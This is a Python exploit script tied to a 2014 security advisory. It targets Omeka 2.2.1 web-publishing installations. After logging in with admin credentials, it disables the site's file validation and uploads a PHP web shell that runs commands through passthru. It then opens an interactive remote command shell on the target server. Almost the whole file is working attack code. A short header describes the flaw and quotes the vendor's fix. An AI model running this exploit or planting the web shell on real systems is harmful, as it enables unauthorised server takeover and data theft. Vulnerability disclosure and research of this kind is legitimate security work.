#!/usr/bin/env python
#
#
# Omeka 2.2.1 Remote Code Execution Exploit
#
#
# Vendor: Omeka Team (CHNM GMU)
# Product web page: http://www.omeka.org
# Affected version: 2.2.1 and 2.2
#
# Summary: Omeka is a free, flexible, and open source web-publishing
# platform for the display of library, museum, archives, and scholarly
# collections and exhibitions. Its 'five-minute setup' makes launching
# an online exhibition as easy as launching a blog.
#
# Desc: Omeka suffers from an authenticated arbitrary PHP code execution.
# The vulnerability is caused due to the improper verification of
# uploaded files in '/admin/items/add' script thru the 'file[0]' POST
# parameter. This can be exploited to execute arbitrary PHP code by
# uploading a malicious PHP script file that will be stored in
# '/files/original' directory after successfully disabling the file
# validation option (or adding something like 'application/x-php' into the
# allowed MIME types list) and bypassing the rewrite rule in the '.htaccess'
# file with '.php5' extension.
#
# .htaccess fix by vendor:
# -------------------------------------------------------
# Line 29: -RewriteRule !\.php$ - [C]
# Line 29: +RewriteRule !\.(php[0-9]?|phtml|phps)$ - [C]
# -------------------------------------------------------
#
# - Role permission for disabling validation and uploading files: Super
# - Role permission for uploading files: Super, Admin
#
# Ref: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5193.php
#
# Tested on: Kali Linux 3.7-trunk-686-pae
#    	     Apache/2.2.22 (Debian)
#            PHP 5.4.4-13(apache2handler)
#            MySQL 5.5.28
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2014-5194
# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5194.php
#
#
# 16.07.2014
#
#

version = '2.0.0.251'

import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re

from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError

init()

if os.name == 'posix': os.system('clear')
if os.name == 'nt': os.system('cls')
piton = os.path.basename(sys.argv[0])

def bannerche():
	print '''
 @---------------------------------------------------------------@
 |                                                               |
 |           Omeka 2.2.1 Remote Code Execution Exploit           |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2014-5194                       |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          '''
	if len(sys.argv) < 3:
		print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: '+Fore.RESET+piton+' <hostname> <path>\n'
		print '\x20\x20[*] '+Fore.CYAN+'Example: '+Fore.RESET+piton+' zeroscience.mk omeka\n'
		sys.exit()

bannerche()

print '\n\x20\x20[*] Initialising exploit '+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET

host = sys.argv[1]
path = sys.argv[2]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	opener.open('http://'+host+'/'+path+'/admin/users/login')
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print '\x20\x20[*] Checking path '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your path entry.'+Fore.RESET
		print
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print '\x20\x20[*] Checking host '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your hostname entry.'+Fore.RESET
		print
		sys.exit()

print '\x20\x20[*] Checking host and path '+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Login please.'

username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')

login_data = urllib.urlencode({
							'username' : username,
							'password' : password,
							'remember' : '0',
							'submit' : 'Log In'
							})

login = opener.open('http://'+host+'/'+path+'/admin/users/login', login_data)
auth = login.read()
for session in cj:
	sessid = session.name

print '\x20\x20[*] Mapping session ID '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)
print '\x20\x20[*] Cookie: '+Fore.YELLOW+cookie+Fore.RESET

if re.search(r'Login information incorrect. Please try again.', auth):
	print '\x20\x20[*] Faulty credentials given '+'.'*30+Fore.RED+'[ER]'+Fore.RESET
	print
	sys.exit()
else:
	print '\x20\x20[*] Authenticated '+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET

disable_file_validation = urllib.urlencode({
										'disable_default_file_validation' : '1',
										'submit' : 'Save+Changes'
										})

opener.open('http://'+host+'/'+path+'/admin/settings/edit-security', disable_file_validation)
print '\x20\x20[*] Disabling file validation '+'.'*29+Fore.GREEN+'[OK]'+Fore.RESET

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('public', '1')
    form.add_field('submit', 'Add Item')
    
    form.add_file('file[0]', 'thricerbd.php5', 
                  fileHandle=StringIO('<?php echo \"<pre>\"; passthru($_GET[\'cmd\']); echo \"</pre>\"; ?>'))

    request = urllib2.Request('http://'+host+'/'+path+'/admin/items/add')
    request.add_header('User-agent', 'joxypoxy 2.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    print '\x20\x20[*] Sending payload '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
    checkitemid = urllib2.urlopen(request).read()
    itemid = re.search('The item #(\d+)', checkitemid).group(1)
    print '\x20\x20[*] Getting item ID '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
    print '\x20\x20[*] Item ID: '+Fore.YELLOW+itemid+Fore.RESET


checkfileid = opener.open('http://'+host+'/'+path+'/admin/items/show/'+itemid)
fileid = re.search('/admin/files/show/(\d+)', checkfileid.read()).group(1)
print '\x20\x20[*] Getting file ID '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] File ID: '+Fore.YELLOW+fileid+Fore.RESET

print '\x20\x20[*] Getting file name '+'.'*37+Fore.GREEN+'[OK]'+Fore.RESET
checkhash = opener.open('http://'+host+'/'+path+'/admin/files/show/'+fileid)
hashfile = re.search('/files/original/(.+?).php5', checkhash.read()).group(1)
print '\x20\x20[*] File name: '+Fore.YELLOW+hashfile+'.php5'+Fore.RESET

print '\x20\x20[*] Starting logging service '+'.'*30+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Spawning shell '+'.'*40+Fore.GREEN+'[OK]'+Fore.RESET
time.sleep(1)

furl = '/files/original/'+hashfile+'.php5'

print
today = datetime.date.today()
fname = 'omeka-'+today.strftime('%d-%b-%Y')+time.strftime('_%H%M%S')+'.log'
logging.basicConfig(filename=fname,level=logging.DEBUG)

logging.info(' '+'+'*75)
logging.info(' +')
logging.info(' + Log started: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S'))
logging.info(' + Title: Omeka 2.2.1 Remote Code Execution Exploit')
logging.info(' + Python program executed: '+sys.argv[0])
logging.info(' + Version: '+version)
logging.info(' + Full query: \''+piton+'\x20'+host+'\x20'+path+'\'')
logging.info(' + Username input: '+username)
logging.info(' + Password input: '+password)
logging.info(' + Vector: '+'http://'+host+'/'+path+furl)
logging.info(' +')
logging.info(' + Advisory ID: ZSL-2014-5194')
logging.info(' + Zero Science Lab - http://www.zeroscience.mk')
logging.info(' +')
logging.info(' '+'+'*75+'\n')

print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n'+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
	try:
		cmd = raw_input(Fore.RED+'shell@'+host+':~# '+Fore.RESET)
		execute = opener.open('http://'+host+'/'+path+furl+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)

		print Style.BRIGHT+Fore.CYAN
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print Style.RESET_ALL+Fore.RESET

		if cmd.strip() == 'exit':
			break

		logging.info('Command executed: '+cmd+'\n\nOutput: \n'+'='*8+'\n\n'+cmdout.groups()[0].strip()+'\n\n'+'-'*60+'\n')
	except Exception:
		break

logging.warning('\n\nLog ended: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S')+'\n\nEND OF LOG')
print '\x20\x20[*] Carpe commentarius '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Log file: '+Fore.YELLOW+fname+Fore.RESET
print

sys.exit()

